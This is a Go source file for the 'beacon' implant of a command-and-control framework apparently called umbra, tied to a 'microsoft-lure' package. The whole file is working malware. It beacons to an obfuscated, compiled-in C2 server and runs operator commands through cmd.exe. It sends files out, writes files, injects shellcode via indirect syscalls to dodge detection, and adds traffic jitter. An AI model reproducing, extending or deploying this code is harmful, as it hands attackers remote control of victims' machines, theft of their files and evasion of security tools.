// Command beacon is the umbra implant. It checks in with the C2 over HTTPS
// using the shared encrypted envelope, runs whatever tasks the operator queued
// and ships the results back. Shellcode injection goes through the umbra
// indirect-syscall engine, so nothing touches ntdll via the import table.
//
// The server URL, passphrase, User-Agent and optional certificate pin are
// compiled in by cmd/pack (see config.go) and are stored XOR-masked + base64 so
// they do not appear as readable strings in the binary.
package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/nullbyter19/umbra-microsoft-lure"
	"github.com/nullbyter19/umbra-microsoft-lure/c2/proto"
)

const (
	httpTimeout = 30 * time.Second
	maxRespSize = 32 << 20
	defaultUA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
)

func main() {
	// Parse flags defensively. When the beacon is reflectively mapped inside
	// another host process (e.g. powershell.exe via reflect.ps1), os.Args carries
	// the HOST's command line (-NoProfile, -nop, -ep, ...). A plain flag.Parse()
	// would hit the first unknown flag, print usage and call os.Exit(2), killing
	// the host process and the beacon before it ever checks in. A private FlagSet
	// with ContinueOnError absorbs everything it does not recognise, so the beacon
	// runs identically whether launched directly or reflectively mapped.
	fs := flag.NewFlagSet("beacon", flag.ContinueOnError)
	fs.SetOutput(io.Discard)
	once := fs.Bool("once", false, "check in once, run any pending tasks and exit")
	_ = fs.Parse(os.Args[1:])

	server := unmask(cfgServerB64)
	pass := unmask(cfgPassB64)
	ua := unmask(cfgUAB64)
	pin := strings.ToLower(strings.TrimSpace(unmask(cfgPinB64)))
	if ua == "" {
		ua = defaultUA
	}
	if server == "" || pass == "" {
		fmt.Fprintln(os.Stderr, "[-] beacon is not configured: run cmd/pack first")
		os.Exit(1)
	}

	key := proto.Key(pass)
	client := newClient(pin, ua)
	bid := deriveID()
	host := hostInfo()

	// Bring the syscall engine up once; if it fails, shell/task handling still
	// works, only in-memory execution is disabled.
	var engine *umbra.Engine
	if e, err := umbra.New(); err == nil {
		engine = e
	}

	sleep := time.Duration(cfgSleepSecs) * time.Second

	for {
		req := &proto.Request{ID: bid, Seq: 0, Kind: proto.KindCheckin, Host: host}
		resp, err := roundTrip(client, server, key, req)
		if err != nil {
			fmt.Fprintln(os.Stderr, "[-] checkin:", err)
			if *once {
				return
			}
			sleepJitter(sleep)
			continue
		}

		var results []proto.TaskResult
		exit := false
		for _, t := range resp.Tasks {
			r, e := runTask(engine, &sleep, t)
			results = append(results, r)
			if t.Op == proto.OpExit {
				exit = true
			}
			if e != nil {
				fmt.Fprintln(os.Stderr, "[-] task", t.TID, ":", e)
			}
		}

		if len(results) > 0 {
			rr := &proto.Request{ID: bid, Seq: 0, Kind: proto.KindResult, Results: results}
			if _, err := roundTrip(client, server, key, rr); err != nil {
				fmt.Fprintln(os.Stderr, "[-] results:", err)
			}
		}

		if exit || *once {
			return
		}
		sleepJitter(sleep)
	}
}

// newClient builds the HTTPS client. When a pin is supplied the certificate
// chain is not validated by a CA (the lab cert is self-signed); instead the
// leaf certificate's SHA-256 must match the pinned fingerprint, which also
// defeats an intercepting proxy that presents a different leaf.
func newClient(pin, ua string) *http.Client {
	cfg := &tls.Config{MinVersion: tls.VersionTLS12}
	if pin != "" {
		cfg.InsecureSkipVerify = true
		cfg.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			if len(rawCerts) == 0 {
				return fmt.Errorf("beacon: no peer certificate")
			}
			sum := sha256.Sum256(rawCerts[0])
			got := hex.EncodeToString(sum[:])
			if got != pin {
				return fmt.Errorf("beacon: certificate pin mismatch")
			}
			return nil
		}
	} else {
		// No pin configured: accept the self-signed lab certificate.
		cfg.InsecureSkipVerify = true
	}
	return &http.Client{
		Timeout:   httpTimeout,
		Transport: &tlsTransport{cfg: cfg, ua: ua},
	}
}

// tlsTransport wraps a plain http.Transport so every request carries the
// configured User-Agent, keeping the beacon's TLS and header setup in one place.
type tlsTransport struct {
	cfg *tls.Config
	ua  string
}

func (t *tlsTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", t.ua)
	}
	tr := &http.Transport{TLSClientConfig: t.cfg, IdleConnTimeout: 30 * time.Second}
	return tr.RoundTrip(req)
}

// roundTrip seals req, POSTs it to the endpoint and returns the decoded
// Response. A non-2xx status is an error.
func roundTrip(client *http.Client, server string, key []byte, req *proto.Request) (*proto.Response, error) {
	body, err := proto.SealMessage(key, req)
	if err != nil {
		return nil, err
	}
	httpReq, err := http.NewRequest(http.MethodPost, server, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Content-Type", "application/octet-stream")

	httpResp, err := client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer httpResp.Body.Close()

	raw, err := io.ReadAll(io.LimitReader(httpResp.Body, maxRespSize))
	if err != nil {
		return nil, err
	}
	if httpResp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("beacon: server returned %d", httpResp.StatusCode)
	}

	var resp proto.Response
	if err := proto.OpenMessage(key, raw, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

// runTask executes a single operator task and returns its result. An error is
// returned only for local failures worth logging; the result is always sent.
func runTask(engine *umbra.Engine, sleep *time.Duration, t proto.Task) (proto.TaskResult, error) {
	res := proto.TaskResult{TID: t.TID}
	switch t.Op {
	case proto.OpShell:
		out, err := exec.Command("cmd.exe", "/c", t.Arg).CombinedOutput()
		res.Out = string(out)
		if err != nil {
			res.Out += "\n" + err.Error()
		}
		res.OK = true

	case proto.OpDownload:
		data, err := os.ReadFile(t.Arg)
		if err != nil {
			res.Out = err.Error()
			return res, nil
		}
		res.Out = base64.StdEncoding.EncodeToString(data)
		res.OK = true

	case proto.OpUpload:
		var ua proto.UploadArg
		if err := json.Unmarshal([]byte(t.Arg), &ua); err != nil {
			res.Out = "bad upload arg: " + err.Error()
			return res, nil
		}
		data, err := base64.StdEncoding.DecodeString(ua.Data)
		if err != nil {
			res.Out = "bad upload data: " + err.Error()
			return res, nil
		}
		if err := os.WriteFile(ua.Path, data, 0o600); err != nil {
			res.Out = err.Error()
			return res, nil
		}
		res.Out = fmt.Sprintf("wrote %d bytes to %s", len(data), ua.Path)
		res.OK = true

	case proto.OpInject:
		if engine == nil {
			res.Out = "in-memory execution unavailable (umbra engine failed to start)"
			return res, nil
		}
		sc, err := hex.DecodeString(strings.TrimSpace(t.Arg))
		if err != nil {
			res.Out = "bad shellcode hex: " + err.Error()
			return res, nil
		}
		th, err := engine.Run(sc)
		if err != nil {
			res.Out = err.Error()
			return res, nil
		}
		res.Out = fmt.Sprintf("executed %d bytes on thread 0x%x", len(sc), th)
		res.OK = true

	case proto.OpPortScan:
		out, err := runPortScan(t.Arg)
		if err != nil {
			res.Out = err.Error()
			return res, nil
		}
		res.Out = out
		res.OK = true

	case proto.OpPriv:
		out, err := runPriv(t.Arg)
		if err != nil {
			res.Out = err.Error()
			return res, nil
		}
		res.Out = out
		res.OK = true

	case proto.OpSleep:
		n, err := strconv.Atoi(strings.TrimSpace(t.Arg))
		if err != nil || n < 0 {
			res.Out = "bad sleep value: " + t.Arg
			return res, nil
		}
		*sleep = time.Duration(n) * time.Second
		res.Out = fmt.Sprintf("sleep set to %ds", n)
		res.OK = true

	case proto.OpExit:
		res.Out = "bye"
		res.OK = true

	default:
		res.Out = "unknown op " + t.Op
	}
	return res, nil
}

// hostInfo collects the identifying details reported at check-in.
func hostInfo() proto.HostInfo {
	h, _ := os.Hostname()
	return proto.HostInfo{
		Hostname: h,
		User:     os.Getenv("USERNAME"),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
	}
}

// deriveID builds a stable per-host identifier from the hostname and username.
func deriveID() string {
	h, _ := os.Hostname()
	sum := sha256.Sum256([]byte(h + "\\" + os.Getenv("USERNAME")))
	return hex.EncodeToString(sum[:8])
}

// sleepJitter sleeps for the base interval plus a random jitter percentage, so
// beacon traffic does not form a fixed-interval pattern.
func sleepJitter(base time.Duration) {
	if base <= 0 {
		base = time.Second
	}
	if cfgJitterPct > 0 {
		j := rand.Intn(int(base)*cfgJitterPct/100 + 1)
		base += time.Duration(j)
	}
	time.Sleep(base)
}
